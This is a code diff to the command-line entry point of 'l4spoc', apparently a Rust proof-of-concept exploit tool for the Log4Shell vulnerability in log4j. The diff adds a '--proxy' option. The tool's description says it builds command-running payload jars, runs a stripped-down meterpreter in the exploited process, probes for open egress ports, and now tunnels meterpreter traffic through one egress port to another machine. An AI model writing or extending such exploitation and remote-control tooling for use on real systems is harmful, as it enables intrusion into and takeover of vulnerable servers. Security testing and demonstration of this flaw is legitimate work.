@@ -5,6 +5,7 @@ mod ldap_server;
 mod build_java;
 mod common;
 mod multiplexed;
+mod tcp_proxy;
 
 use common::{RunServerCfg, BuildCmdCfg};
 use std::fs;
@@ -14,9 +15,9 @@ use clap::{Arg, App, ArgMatches};
 #[tokio::main]
 async fn main() -> () {
     let matches = App::new("l4spoc")
-        .version("0.3.0")
+        .version("0.4.0")
         .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
-        .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.  You can run on multiple ports simultaneously to attempt to see what ports may be available for egress on the target machine.")
+        .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.  You can run on multiple ports simultaneously to attempt to see what ports may be available for egress on the target machine.  This version adds a proxy option.  If the request is not LDAP or HTTP it can then proxy the request to another machine, again on the same port.  If the target machine has only on egress port you can server LDAP, HTTP and use the same port to proxy the meterpreter connection to another local port or another machine.")
         .subcommand(App::new("build")
             .about("Build java class payload")
             .arg(Arg::new("class_name")
@@ -78,6 +79,10 @@ async fn main() -> () {
                 .long("pC20")
                 .takes_value(false)
                 .help("Use the 20 common ports.")
+            ).arg(Arg::new("proxy")
+                .long("proxy")
+                .takes_value(true)
+                .help("The proxy address we want to send non http/ldap requests to. foramt = addr:port")
             ).arg(Arg::new("wwwroot")
                 .long("wwwroot")
                 .default_value("wwwroot")
@@ -183,6 +188,7 @@ fn convert_args_for_run_server_cfg(m : &ArgMatches) -> RunServerCfg{
         ports : get_ports_from_args(m),
         ports_file_name : convert_option(m.value_of("Op")),
         failed_file_name : convert_option(m.value_of("Of")),
+        proxy_addr : convert_option(m.value_of("proxy")),
     }
 }
 
